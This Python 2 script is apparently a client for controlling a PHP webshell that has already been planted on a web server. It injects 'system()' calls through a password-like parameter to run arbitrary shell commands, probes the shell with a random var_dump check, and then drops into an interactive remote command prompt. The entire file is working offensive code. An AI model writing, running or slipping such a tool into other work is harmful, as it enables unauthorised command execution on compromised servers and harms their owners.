#!/usr/bin/env python
# encoding: utf-8

import requests
import random
import string
import sys
import urllib


'''
def code_exec(url, code):
    return status


def check_shell_exec(url):

def get_system_info():

def get_phpinfo():

def http_proxy():

def socks_proxy():

def

'''

'''
def get_disabled_function():
'''

def init(url, method, auth):
    return ""


def shell_exec(url, method, auth, command):
    # system, exec, shell_exec, popen, proc_open, passthru
    if method == "POST":
        data = {auth:"system($_POST[command]);",  "command":command}
        response = requests.post(url, data=data)
    elif method == "GET":
        params = {auth:"system($_GET[command]);", "command":command}
        response = requests.get(url, params=params)
    else:
        return (False, "Unsupported method!")
    content = response.text
    if response.status_code == 200:
        return (True, content)
    else:
        return (False, content)

def shell(url, method, auth):
    print "[+] Opening shell..."
    while True:
        command = raw_input("$ ")
        if string.lower(command) == "exit":
            break
        result = shell_exec(url, method, auth, command)
        if result[0]:
            print "%s" % (result[1])
        else:
            print "[-] %s" % (result[1])

def random_string(length, random_range):
    result = ""
    for i in range(length):
        result += random.choice(random_range)
    return result

def check_working(url, method, auth):
    print "[+] Checking webshell valid..."
    key = random_string(6, string.letters)
    value = random_string(32, string.letters)
    print "[+] Using key : [%s]" % (key)
    print "[+] Using value : [%s]" % (value)
    if method == "POST":
        data = {auth:'var_dump("$_POST[%s]");' % (key), key:value}
        response = requests.post(url, data=data)
    elif method == "GET":
        params = {auth:'var_dump("$_POST[%s]");' % key}
        url = build_url(url, params)
        data = {key:value}
        response = requests.post(url, data=data)
    else:
        return "Not supported method!"
    content = response.content
    return value in content

def url_encode(word):
    return urllib.quote(word)

def url_decode(word):
    return urllib.unquote(word)

def build_url(url, params):
    if not url.endswith("?"):
        url += "?"
    for key,value in params.items():
        url += "%s=%s&" % (key, url_encode(value))
    return url[0:-1]

def check_status_code(url):
    try:
        response = requests.head(url)
        return response.status_code
    except:
        return False

def main():
    if len(sys.argv) != 4:
        print "Usage : "
        print "        python %s [URL] [METHOD] [AUTH]" % (sys.argv[0])
        print "Example : "
        print "        python %s http://127.0.0.1/c.php POST c" % (sys.argv[0])
        print "Author : "
        print "        WangYihang <wangyihanger@gmail.com>"
        exit(1)
    url = sys.argv[1]
    method = sys.argv[2]
    auth = sys.argv[3]
    print "Using config : "
    print "    URL : %s" % (url)
    print "    METHOD : %s" % (method)
    print "    AUTH : %s" % (auth)
    print "[+] Connecting..."
    print "[+] Checking status code..."
    status = check_status_code(url)
    if status == False:
        print "[-] Connect error! Maybe server has been down!"
        exit(2)
    print "[+] Status Code : %d" % (status)
    if check_working(url, method, auth) == False:
        print "[+] The webshell maybe invaild! Check your configuration!"
        exit(3)
    print "[+] Your webshell is working well!"
    shell(url, method, auth)

if __name__ == "__main__":
    main()
